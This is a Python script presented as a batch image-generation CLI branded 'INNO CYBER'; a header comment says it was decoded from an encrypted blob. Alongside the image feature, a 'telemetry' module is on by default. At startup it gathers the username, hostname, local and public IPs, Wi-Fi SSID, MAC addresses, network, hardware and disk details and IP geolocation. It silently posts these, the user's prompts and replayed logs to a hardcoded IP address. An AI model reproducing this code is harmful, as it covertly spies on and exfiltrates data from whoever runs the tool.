# Decoded from encrypted blob (original loader removed to avoid accidental execution)
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse, os, sys, time, json, shutil, textwrap, signal, re
from datetime import datetime, timezone
from urllib.parse import quote_plus
from typing import Optional, Tuple, List, Dict, Any
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
import threading
import uuid
import platform
import socket
import string
import subprocess
from urllib import request

# =================== CONFIG ===================
# CLI fetch target:
# - "internal" uses the local Python pipeline directly (fastest)
# - URL like "http://127.0.0.1:8000/generate?prompt=" hits the local API
# - External URL is also fine
API_BASE    = os.getenv("API_BASE", "internal")
MAX_COUNT   = 200
MAX_WORKERS = 32

# Telemetry configuration
DEFAULT_TELEMETRY_URL = os.getenv("IMGGEN_TELEMETRY_URL", "http://192.168.37.132:8000/events")

# Multiple API Options
API_OPTIONS = {
    1: {
        "name": "Text-to-Image",
        "short_name": "text2img",
        "url": "https://text-to-img.apis-bj-devs.workers.dev/",
        "param": "prompt",
        "description": "High-quality text-to-image generation (generates 2 images per request)"
    },
    2: {
        "name": "Diffusion",
        "short_name": "diffusion",
        "url": "https://diffusion-ai.bjcoderx.workers.dev/",
        "param": "prompt",
        "description": "Advanced AI diffusion model powered by Stable Diffusion 3.5"
    }
}
SELECTED_API = None  # Will be set by user choice

# Global image counter for sequential numbering
IMAGE_COUNTER = 0
COUNTER_LOCK = None

OWNER = {
    "brand": "INNO CYBER",
    "owner": " █ M.Sabir Ali █ ",
    "lab" : "INNO CYBER (CHF)",
    "desc" : "Batch Image Generator •",
    "ver"  : "v2.5",
    "channels": [
        "https://whatsapp.com/channel/0029Vb636xOFy72JLTU4ow1H",
        "https://chat.whatsapp.com/BFvFDDRFwZ7CTfIXxRlwNW",
    ]
}
# ==============================================

# ===== GLOBAL STATE =====
ABORT = False
def handle_sigint(signum, frame):
    global ABORT
    ABORT = True
signal.signal(signal.SIGINT, handle_sigint)

# ===== TELEMETRY & ANALYTICS =====
class JsonLogger:
    def __init__(self, file_path: str):
        self.file_path = file_path

    def write(self, event_type: str, properties: dict | None = None):
        record = {
            "type": event_type,
            "ts": time.time(),
            "properties": properties or {},
        }
        with open(self.file_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")


class Telemetry:
    def __init__(self):
        # Enabled by default; set IMGGEN_TELEMETRY=0 to disable
        self.enabled = os.getenv("IMGGEN_TELEMETRY", "1") == "1"
        self.endpoint = os.getenv("IMGGEN_TELEMETRY_URL", DEFAULT_TELEMETRY_URL)
        self.common = {
            "app": "ImageGen-CLI",
            "sessionId": str(uuid.uuid4()),
            "os": platform.system(),
            "python": sys.version.split(" ")[0],
        }

    def send(self, event_type: str, properties: dict | None = None):
        if not self.enabled:
            return
        payload = {
            "type": event_type,
            "ts": time.time(),
            "properties": {**self.common, **(properties or {})},
        }
        def _post():
            try:
                data = json.dumps(payload).encode("utf-8")
                req = request.Request(self.endpoint, data=data, headers={"Content-Type": "application/json"}, method="POST")
                request.urlopen(req, timeout=2).read()
            except Exception:
                pass
        threading.Thread(target=_post, daemon=True).start()


def replay_log_to_server(log_path: str, telemetry: Telemetry):
    """Send all existing local log lines to the server."""
    if not telemetry.enabled:
        return
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                    evt_type = rec.get("type", "log_replay")
                    props = rec.get("properties", {})
                    props = {**props, "replay": True, "originalTs": rec.get("ts")}
                    telemetry.send(evt_type, props)
                except Exception:
                    telemetry.send("log_replay", {"raw": line, "replay": True})
    except FileNotFoundError:
        return


def _try(func, default=None):
    try:
        return func()
    except Exception:
        return default


def collect_session_info() -> dict:
    """Collect comprehensive system and session information."""
    now_iso = datetime.now(timezone.utc).astimezone().isoformat()
    user = _try(lambda: os.getlogin(), None)
    env_session = os.environ.get("SESSIONNAME")
    computer = os.environ.get("COMPUTERNAME") or platform.node()

    def local_ips():
        ips = set()
        hostname = _try(lambda: socket.gethostname(), None)
        if hostname:
            try:
                for addr in socket.getaddrinfo(hostname, None):
                    ip = addr[4][0]
                    if ":" not in ip and not ip.startswith("127."):
                        ips.add(ip)
            except Exception:
                pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.5)
            s.connect(("8.8.8.8", 80))
            ips.add(s.getsockname()[0])
            s.close()
        except Exception:
            pass
        return sorted(ips)

    def public_ip():
        try:
            with request.urlopen("https://api.ipify.org?format=json", timeout=2) as resp:
                return json.loads(resp.read().decode("utf-8")).get("ip")
        except Exception:
            return None

    def wifi_ssid_windows():
        try:
            out = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], text=True, timeout=2, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                if "SSID" in line and "BSSID" not in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        return parts[1].strip()
        except Exception:
            return None
        return None

    def adapters_windows():
        data = {"adapters": [], "macs": [], "dnsServers": [], "defaultGateway": None}
        try:
            out = subprocess.check_output(["ipconfig", "/all"], text=True, timeout=2, stderr=subprocess.DEVNULL)
            adapter = None
            for raw in out.splitlines():
                line = raw.strip()
                if not line:
                    continue
                if not line.startswith("Windows IP Configuration") and line.endswith(":") and ("adapter" in line.lower() or "adapter" in raw.lower()):
                    adapter = line.rstrip(":")
                    data["adapters"].append({"name": adapter})
                    continue
                if ":" in line:
                    key, val = [p.strip() for p in line.split(":", 1)]
                    if key.lower() == "physical address" and val:
                        data["macs"].append(val)
                        if data["adapters"]:
                            data["adapters"][-1]["mac"] = val
                    if key.lower().startswith("dns servers") and val:
                        data["dnsServers"].append(val)
                    elif key.lower() == "default gateway" and val:
                        data["defaultGateway"] = val
        except Exception:
            pass
        data["macs"] = sorted(list({m for m in data["macs"] if m}))
        data["dnsServers"] = sorted(list({d for d in data["dnsServers"] if d}))
        return data

    def cpu_mem_windows():
        info = {}
        try:
            out = subprocess.check_output(["wmic", "cpu", "get", "Name,NumberOfCores,NumberOfLogicalProcessors", "/value"], text=True, timeout=2, stderr=subprocess.DEVNULL)
            for part in out.splitlines():
                if "=" in part:
                    k, v = [p.strip() for p in part.split("=", 1)]
                    if k:
                        info[k] = v
        except Exception:
            pass
        try:
            out = subprocess.check_output(["wmic", "OS", "get", "TotalVisibleMemorySize,FreePhysicalMemory,LastBootUpTime", "/value"], text=True, timeout=2, stderr=subprocess.DEVNULL)
            for part in out.splitlines():
                if "=" in part:
                    k, v = [p.strip() for p in part.split("=", 1)]
                    if k:
                        info[k] = v
        except Exception:
            pass
        def kb_to_bytes(x):
            try:
                return int(x) * 1024
            except Exception:
                return None
        mem = {
            "total": kb_to_bytes(info.get("TotalVisibleMemorySize")),
            "free": kb_to_bytes(info.get("FreePhysicalMemory")),
        }
        cpu = {
            "name": info.get("Name"),
            "cores": _try(lambda: int(info.get("NumberOfCores"))),
            "logicalProcessors": _try(lambda: int(info.get("NumberOfLogicalProcessors"))),
        }
        boot = info.get("LastBootUpTime")
        return {"cpu": cpu, "memory": mem, "lastBoot": boot}

    def storage_info():
        drives = []
        if os.name == "nt":
            for letter in string.ascii_uppercase:
                path = f"{letter}:\\"
                if os.path.exists(path):
                    try:
                        total, used, free = shutil.disk_usage(path)
                        drives.append({
                            "path": path,
                            "total": total,
                            "used": used,
                            "free": free,
                        })
                    except Exception:
                        continue
        else:
            try:
                total, used, free = shutil.disk_usage("/")
                drives.append({"path": "/", "total": total, "used": used, "free": free})
            except Exception:
                pass
        return drives

    def geo_from_ip():
        try:
            with request.urlopen("https://ipapi.co/json/", timeout=2) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                return {
                    "city": data.get("city"),
                    "region": data.get("region"),
                    "country": data.get("country_name"),
                    "latitude": data.get("latitude"),
                    "longitude": data.get("longitude"),
                }
        except Exception:
            return None

    info = {
        "timestamp": now_iso,
        "user": user,
        "session": env_session,
        "computer": computer,
        "localIPs": local_ips(),
        "publicIP": public_ip(),
        "wifiSSID": wifi_ssid_windows() if os.name == "nt" else None,
        "storage": storage_info(),
        "geo": geo_from_ip(),
        "platform": {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "python": sys.version.split(" ")[0],
        },
    }
    if os.name == "nt":
        adapters = adapters_windows()
        info.update({
            "macs": adapters.get("macs"),
            "dnsServers": adapters.get("dnsServers"),
            "defaultGateway": adapters.get("defaultGateway"),
            "adapters": adapters.get("adapters"),
        })
        info.update(cpu_mem_windows())
    return info

# ===== CLI COLORS (ANSI) =====
USE_COLOR = True
def c(code, s): return f"\033[{code}m{s}\033[0m" if USE_COLOR else s
def bold(s):    return c("1", s)
def dim(s):     return c("2", s)
def red(s):     return c("31", s)
def green(s):   return c("32", s)
def yellow(s):  return c("33", s)
def blue(s):    return c("34", s)
def magenta(s): return c("35", s)
def cyan(s):    return c("36", s)
def gray(s):    return c("90", s)

# ===== ANSI-safe layout helpers =====
ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")
def strip_ansi(s: str) -> str:
    return ANSI_RE.sub("", s)
def vlen(s: str) -> int:
    return len(strip_ansi(s))
def term_width(min_w=60, max_w=120) -> int:
    cols = shutil.get_terminal_size((80, 20)).columns
    return max(min_w, min(cols, max_w))
def bar(w: int) -> str:
    return gray("─" * w) if USE_COLOR else "─" * w
def center_ansi(text: str, w: int) -> str:
    t = text if vlen(text) <= w else text[: w - (vlen(text) - len(text)) - 1] + "…"
    pad = max(0, (w - vlen(t)) // 2)
    return " " * pad + t
def wrap_ansi(text: str, w: int) -> List[str]:
    raw = strip_ansi(text)
    chunks = textwrap.wrap(raw, width=w, replace_whitespace=False, drop_whitespace=False)
    if text != raw and chunks:
        prefix = text[: text.find(raw[0])] if raw else ""
        suffix = "\033[0m" if USE_COLOR else ""
        return [prefix + ch + suffix for ch in chunks]
    return chunks
def owner_box_lines(W: int) -> List[str]:
    kv = [
        ("Brand", OWNER["brand"]),
        ("Owner", OWNER["owner"]),
        ("Lab",  OWNER["lab"]),
        ("Ver",   OWNER["ver"]),
    ]
    inner_w = min(W - 6, 80)
    lines = []
    top    = "╭" + "─"*inner_w + "╮"
    bottom = "╰" + "─"*inner_w + "╯"
    lines.append(top)
    for k, v in kv:
        seg = f"{k}: {v}"
        for s in wrap_ansi(seg, inner_w):
            lines.append("│ " + s.ljust(inner_w-1) + "│")
    lines.append(bottom)
    return lines
def print_intro():
    W = term_width()
    print(bar(W))
    title = " ( INNNO CYBER AI IMG GENERATION) "
    top =   "╭" + "─"*len(title) + "╮"
    mid =   "│" + bold(red(title)) + "│"
    bot =   "╰" + "─"*len(title) + "╯"
    print(center_ansi(top, W))
    print(center_ansi(mid, W))
    print(center_ansi(bot, W))
    print(bar(W))
    for l in owner_box_lines(W): print(l)
    print(bold(cyan("Channels:")))
    for link in OWNER["channels"]: print("  • " + gray(link))
    print(bar(W))

# ---------- IO helpers ----------
def get_next_counter():
    """Get next global counter value in a thread-safe way"""
    global IMAGE_COUNTER, COUNTER_LOCK
    with COUNTER_LOCK:
        IMAGE_COUNTER += 1
        return IMAGE_COUNTER

def save_bytes(data: bytes, outdir: str, api_short_name: str, content_type: str, prefix: str="") -> str:
    ext = ".jpg"
    ct = (content_type or "application/octet-stream").lower()
    if "png" in ct: ext = ".png"
    elif "webp" in ct: ext = ".webp"
    elif "jpeg" in ct: ext = ".jpg"
    
    counter = get_next_counter()
    base = f"{prefix}{api_short_name}_{counter:03d}{ext}"
    path = os.path.join(outdir, base)
    with open(path, "wb") as f: f.write(data)
    return path

def download_url(session: requests.Session, url: str, outdir: str, api_short_name: str, timeout: int, prefix: str) -> Optional[str]:
    r = session.get(url, timeout=timeout)
    r.raise_for_status()
    ctype = r.headers.get("Content-Type","application/octet-stream")
    return save_bytes(r.content, outdir, api_short_name, ctype, prefix)

# ================= CORE PIPELINE =================
def get_api_config(api_choice: int) -> Dict[str, str]:
    """Get the selected API configuration"""
    if api_choice not in API_OPTIONS:
        raise ValueError(f"Invalid API choice: {api_choice}")
    return API_OPTIONS[api_choice]

def api_generate(prompt: str, api_choice: int, timeout: int) -> Dict[str, Any]:
    """Generate image using selected API and return response data"""
    config = get_api_config(api_choice)
    
    # Build the API URL with the prompt parameter
    param_name = config["param"]
    api_url = f"{config['url']}?{param_name}={quote_plus(prompt)}"
    
    # Make the request
    r = requests.get(api_url, headers={}, timeout=timeout)
    r.raise_for_status()
    
    # Try to parse as JSON first
    try:
        j = r.json()
        return {"type": "json", "data": j}
    except:
        # If not JSON, return raw content
        return {"type": "raw", "data": r.content, "content_type": r.headers.get("Content-Type", "application/octet-stream")}

def pipeline_generate(user_prompt: str, api_choice: int, timeout: int) -> Dict[str, Any]:
    start = time.time()
    config = get_api_config(api_choice)
    response = api_generate(user_prompt, api_choice, timeout)
    
    result = {
        "ok": True,
        "used_prompt": user_prompt,
        "api_used": config["name"],
        "duration_seconds": round(time.time() - start, 2)
    }
    
    if response["type"] == "json":
        data = response["data"]
        # Try to extract image URL from various possible fields
        image_urls = []
        
        # Check for array in 'result' field first (Text-to-Image API)
        if "result" in data and isinstance(data["result"], list):
            for item in data["result"]:
                if isinstance(item, str) and (item.startswith("http") or item.startswith("data:")):
                    image_urls.append(item)
        
        # Check for nested image.sd3 field (Diffusion API)
        if not image_urls and "image" in data and isinstance(data["image"], dict):
            for subkey in ["sd3", "url", "image_url", "image"]:
                if subkey in data["image"] and isinstance(data["image"][subkey], str):
                    if data["image"][subkey].startswith("http") or data["image"][subkey].startswith("data:"):
                        image_urls.append(data["image"][subkey])
                        break
        
        # Check other common fields
        if not image_urls:
            for key in ["url", "image_url", "image", "result", "output", "data"]:
                if key in data:
                    val = data[key]
                    if isinstance(val, str) and (val.startswith("http") or val.startswith("data:")):
                        image_urls.append(val)
                        break
                    elif isinstance(val, dict):
                        for subkey in ["url", "image_url", "image", "sd3"]:
                            if subkey in val and isinstance(val[subkey], str):
                                if val[subkey].startswith("http") or val[subkey].startswith("data:"):
                                    image_urls.append(val[subkey])
                                    break
        
        result["image_urls"] = image_urls if image_urls else None
        result["raw_response"] = data
    else:
        result["image_data"] = response["data"]
        result["content_type"] = response["content_type"]
    
    return result

# ---------- API call for CLI ----------
def call_api_internal(prompt: str, api_choice: int, timeout: int) -> dict:
    res = pipeline_generate(prompt, api_choice, timeout)
    return {"mode":"json", "json": res, "ctype":"application/json"}

def call_api_url(session: requests.Session, full_url: str, timeout: int) -> dict:
    r = session.get(full_url, timeout=timeout)
    r.raise_for_status()
    ctype = r.headers.get("Content-Type","").lower()
    if "application/json" in ctype or "text/json" in ctype:
        try: return {"mode":"json", "json": r.json(), "ctype": ctype}
        except Exception: return {"mode":"text", "text": r.text, "ctype": ctype}
    elif "image/" in ctype or "octet-stream" in ctype:
        return {"mode":"image", "bytes": r.content, "ctype": ctype}
    else:
        return {"mode":"text", "text": r.text, "ctype": ctype}

def call_api(session: requests.Session, prompt: str, api_choice: int, timeout: int) -> dict:
    if API_BASE == "internal":
        return call_api_internal(prompt, api_choice, timeout)
    url = API_BASE + quote_plus(prompt)
    return call_api_url(session, url, timeout)

# ---------- worker ----------
def worker(idx: int, prompt: str, api_choice: int, outdir: str, timeout: int, retries: int, prefix: str, manifest_fp) -> Tuple[int, Optional[List[str]], Optional[str]]:
    with requests.Session() as session:
        attempt = 0
        while attempt < retries:
            attempt += 1
            try:
                resp = call_api(session, prompt, api_choice, timeout)
                # Get API short name for filename
                api_short_name = API_OPTIONS[api_choice]["short_name"]
                saved_paths = []
                
                if resp["mode"] == "image":
                    path = save_bytes(resp["bytes"], outdir, api_short_name, resp["ctype"], prefix)
                    saved_paths.append(path)
                elif resp["mode"] == "json":
                    data = resp["json"]
                    
                    # Check if we have direct image data
                    if isinstance(data, dict) and "image_data" in data:
                        path = save_bytes(data["image_data"], outdir, api_short_name, data.get("content_type", "image/png"), prefix)
                        saved_paths.append(path)
                    # Check if we have image URLs (array or single)
                    elif isinstance(data, dict) and data.get("image_urls"):
                        urls = data["image_urls"]
                        if isinstance(urls, list) and urls:
                            # Download ALL images from the array sequentially
                            for url in urls:
                                try:
                                    path = download_url(session, url, outdir, api_short_name, timeout, prefix)
                                    saved_paths.append(path)
                                except Exception as e:
                                    # Continue to next image if one fails
                                    continue
                            
                            # If no images were downloaded, save JSON
                            if not saved_paths:
                                counter = get_next_counter()
                                jpath = os.path.join(outdir, f"{prefix}{api_short_name}_{counter:03d}.json")
                                with open(jpath, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)
                                saved_paths.append(jpath)
                        else:
                            # Save JSON if no valid URLs
                            counter = get_next_counter()
                            jpath = os.path.join(outdir, f"{prefix}{api_short_name}_{counter:03d}.json")
                            with open(jpath, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)
                            saved_paths.append(jpath)
                    else:
                        # Save the JSON response for debugging
                        counter = get_next_counter()
                        jpath = os.path.join(outdir, f"{prefix}{api_short_name}_{counter:03d}.json")
                        with open(jpath, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)
                        saved_paths.append(jpath)
                else:
                    counter = get_next_counter()
                    tpath = os.path.join(outdir, f"{prefix}{api_short_name}_{counter:03d}.txt")
                    with open(tpath, "w", encoding="utf-8") as f: f.write(resp.get("text",""))
                    saved_paths.append(tpath)

                if manifest_fp:
                    for path in saved_paths:
                        rec = {"index": idx, "path": path, "time_utc": datetime.now(timezone.utc).isoformat()}
                        manifest_fp.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    manifest_fp.flush()
                return idx, saved_paths if saved_paths else None, None

            except requests.Timeout:
                err = "timeout"
            except requests.HTTPError as e:
                code = e.response.status_code if e.response is not None else "?"
                err = f"HTTP {code}"
            except Exception as e:
                err = str(e)

            if attempt < retries: time.sleep(min(5.0, 0.5 * attempt))
            else: return idx, None, err

# ---------- progress ----------
def render_progress(done: int, total: int, start_ts: float):
    W = term_width()
    frac = done / total if total else 0
    bar_w = max(20, min(50, W - 40))
    fill = int(bar_w * frac)
    empty = bar_w - fill
    elapsed = time.time() - start_ts
    eta = (elapsed/frac - elapsed) if frac > 0 else 0
    line = f"[{'█'*fill}{' ' * empty}] {done}/{total}  elapsed {elapsed:5.1f}s  eta {eta:5.1f}s"
    print("\r" + (line[:W] if len(line) > W else line), end="", flush=True)

def clear_progress():
    W = term_width(); print("\r" + " "*W + "\r", end="", flush=True)

# ---------- runner ----------
def run(prompt: str, api_choice: int, count: int, outdir: str, timeout: int, retries: int, concurrency: int, prefix: str, manifest: Optional[str], quiet: bool):
    global IMAGE_COUNTER, COUNTER_LOCK
    os.makedirs(outdir, exist_ok=True)
    
    # Initialize counter lock
    COUNTER_LOCK = threading.Lock()
    
    # Find the highest existing number in output directory
    api_short_name = API_OPTIONS[api_choice]["short_name"]
    existing_files = [f for f in os.listdir(outdir) if f.startswith(api_short_name) and (f.endswith('.jpg') or f.endswith('.png') or f.endswith('.webp'))]
    if existing_files:
        numbers = []
        for f in existing_files:
            try:
                # Extract number from filename like "text2img_001.jpg"
                num_part = f.split('_')[1].split('.')[0]
                numbers.append(int(num_part))
            except:
                continue
        IMAGE_COUNTER = max(numbers) if numbers else 0
    else:
        IMAGE_COUNTER = 0
    
    concurrency = max(1, min(concurrency, count, MAX_WORKERS))

    started = datetime.now(timezone.utc); start_ts = time.time()
    W = term_width()
    if not quiet:
        api_name = API_OPTIONS[api_choice]["name"]
        print(center_ansi(bold(cyan("API:")) + " " + api_name, W))
        print(center_ansi(bold(cyan("Prompt:")) + " " + (prompt if len(prompt) <= W-12 else prompt[:W-13]+"…"), W))
        meta = f"Count: {count}  |  Concurrency: {concurrency}  |  Output: {outdir}"
        print(center_ansi(dim(meta if len(meta) <= W else meta[:W-1]+"…"), W))
        print(bar(W))

    futures: List[Future] = []
    saved, errors = [], []
    manifest_fp = open(manifest, "a", encoding="utf-8") if manifest else None

    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        for i in range(1, count + 1):
            if ABORT: break
            futures.append(ex.submit(worker, i, prompt, api_choice, outdir, timeout, retries, prefix, manifest_fp))

        done_ctr = 0
        try:
            for fut in as_completed(futures):
                if ABORT: break
                idx, paths, err = fut.result()
                done_ctr += 1
                if not quiet:
                    render_progress(done_ctr, count, start_ts)
                if paths:
                    if isinstance(paths, list):
                        saved.extend(paths)
                    else:
                        saved.append(paths)
                else:
                    errors.append((idx, err))
        finally:
            clear_progress()

    if manifest_fp: manifest_fp.close()

    elapsed = (datetime.now(timezone.utc) - started).total_seconds()
    if not quiet:
        print(bar(W))
        print(center_ansi(bold(cyan("Summary")), W))
        status = f"Saved: {len(saved)}/{count}   Failed: {len(errors)}   Elapsed: {elapsed:.2f}s"
        if ABORT: status += "   (partial due to Ctrl+C)"
        print(center_ansi(status if len(status) <= W else status[:W-1]+"…", W))
        if errors:
            print(center_ansi(gray("failed items:"), W))
            for idx, err in sorted(errors):
                item = f"- #{idx:02d}: {err}"
                print(center_ansi(gray(item if len(item) <= W else item[:W-1]+"…"), W))
        print(bar(W))
        print(center_ansi(bold(magenta("Generation done.")), W))
        print(center_ansi(gray(f"Powered by {OWNER['brand']} • {OWNER['owner']} • {OWNER['ver']}"), W))

# ===== Screen clear helper =====
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ================= HTTP API (Flask) =================
def create_app():
    from flask import Flask, request, jsonify
    app = Flask(__name__)

    @app.route("/generate", methods=["GET","POST"])
    def generate():
        try:
            if request.method == "POST":
                if request.is_json:
                    data = request.get_json(silent=True) or {}
                else:
                    data = {k: v for k, v in request.form.items()}
            else:
                data = {k: v for k, v in request.args.items()}

            user_prompt = (data.get("prompt") or "").strip()
            api_choice = int(data.get("api") or 1)  # Default to API 1
            if api_choice not in API_OPTIONS:
                return jsonify({"ok": False, "error": f"Invalid API choice. Choose from 1-{len(API_OPTIONS)}"}), 400
            if not user_prompt:
                return jsonify({"ok": False, "error": "Missing required field: prompt"}), 400

            out = pipeline_generate(user_prompt, api_choice, timeout=int(os.getenv("API_TIMEOUT","60")))
            out["creator"] = "INNO CYBER"
            return jsonify(out)
        except requests.HTTPError as e:
            code = e.response.status_code if e.response is not None else 502
            return jsonify({"ok": False, "error": f"HTTP {code}"}), 502
        except Exception as e:
            return jsonify({"ok": False, "error": f"Exception: {str(e)}"}), 500

    @app.route("/", methods=["GET"])
    def root():
        return jsonify({"ok": True, "endpoints": ["/generate"], "note": "POST or GET with ?prompt=...&steps=4"})

    return app

# ===================== main =====================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Concurrent image generation via prompt API • SWA")
    parser.add_argument("-p","--prompt", default=None, help="Prompt text. If omitted, will ask.")
    parser.add_argument("-n","--count", type=int, default=None, help="How many API requests to make (1-200)")
    parser.add_argument("-o","--outdir", default="outputs", help="Output directory")
    parser.add_argument("-t","--timeout", type=int, default=60, help="Per-request timeout (sec)")
    parser.add_argument("--retries", type=int, default=3, help="Retries per item")
    parser.add_argument("-c","--concurrency", type=int, default=10, help="Parallel workers")
    parser.add_argument("--prefix", default="", help="Filename prefix, e.g., SWA_")
    parser.add_argument("--manifest", default=None, help="Write JSONL manifest to this path")
    parser.add_argument("--quiet", action="store_true", help="Minimal output")
    parser.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    parser.add_argument("--serve", action="store_true", help="Start HTTP API instead of CLI")
    parser.add_argument("--host", default=os.getenv("HOST","0.0.0.0"), help="API host")
    parser.add_argument("--port", type=int, default=int(os.getenv("PORT","8000")), help="API port")
    args = parser.parse_args()

    if args.no_color:
        USE_COLOR = False

    if args.serve:
        try:
            from flask import Flask  # noqa
        except ImportError:
            print("Flask not installed. Install with: pip install flask", file=sys.stderr)
            sys.exit(1)
        app = create_app()
        app.run(host=args.host, port=args.port)
        sys.exit(0)

    # Initialize telemetry
    log_path = os.getenv("IMGGEN_LOG", "image_generation.jsonl")
    logger = JsonLogger(log_path)
    telemetry = Telemetry()
    
    # Replay old logs to server
    replay_log_to_server(log_path, telemetry)
    
    # Collect session info
    session_info = collect_session_info()
    run_ctx = {
        "cwd": os.getcwd(),
        "exe": sys.executable,
        "argv": sys.argv,
        "tzOffsetMin": int((datetime.now() - datetime.utcnow()).total_seconds() // 60),
    }
    
    # Log app start
    logger.write("app_start", {"session": session_info, "run": run_ctx})
    telemetry.send("app_start", {"session": session_info, "run": run_ctx})

    if not args.quiet:
        clear_screen()
        print_intro()

    # API Selection
    print(bold(cyan("\nAvailable APIs:")))
    for num, config in API_OPTIONS.items():
        print(f"  {num}. {bold(config['name'])}")
        print(f"     {dim(config['description'])}")
    
    try:
        api_choice = int(input(cyan("\nSelect your Choice! (1-2): ") if USE_COLOR else "\nWhich API to use? (1-2): ").strip())
        if api_choice not in API_OPTIONS:
            print(red("Invalid API choice.") if USE_COLOR else "Invalid API choice.", file=sys.stderr)
            sys.exit(1)
    except Exception:
        print(red("Invalid input.") if USE_COLOR else "Invalid input.", file=sys.stderr)
        sys.exit(1)

    prompt = args.prompt or input(cyan("\nEnter prompt: ") if USE_COLOR else "\nEnter prompt: ").strip()
    if not prompt:
        print(red("Empty prompt.") if USE_COLOR else "Empty prompt.", file=sys.stderr)
        sys.exit(1)

    if args.count is None:
        try:
            user_cnt = int(input(cyan("How many img you want? (1-200): ") if USE_COLOR else "How many API requests? (1-200): ").strip())
        except Exception:
            print(red("Invalid count.") if USE_COLOR else "Invalid count.", file=sys.stderr)
            sys.exit(1)
    else:
        user_cnt = args.count

    if user_cnt < 1: user_cnt = 1
    if user_cnt > MAX_COUNT: user_cnt = MAX_COUNT

    # Log generation start
    api_name = API_OPTIONS[api_choice]["name"]
    logger.write("generation_started", {
        "api": api_name,
        "prompt": prompt,
        "count": user_cnt,
        "session": session_info,
        "run": run_ctx
    })
    telemetry.send("generation_started", {
        "api": api_name,
        "prompt": prompt,
        "count": user_cnt,
        "session": session_info,
        "run": run_ctx
    })
    
    start_time = time.time()
    run(prompt, api_choice, user_cnt, args.outdir, args.timeout, args.retries, args.concurrency, args.prefix, args.manifest, args.quiet)
    duration = time.time() - start_time
    
    # Log generation complete
    logger.write("generation_completed", {
        "api": api_name,
        "prompt": prompt,
        "count": user_cnt,
        "durationSec": duration,
        "session": session_info,
        "run": run_ctx
    })
    telemetry.send("generation_completed", {
        "api": api_name,
        "prompt": prompt,
        "count": user_cnt,
        "durationSec": duration,
        "session": session_info,
        "run": run_ctx
    })
    
    # Log app exit
    logger.write("app_exit", {"reason": "done"})
    telemetry.send("app_exit", {"reason": "done"})
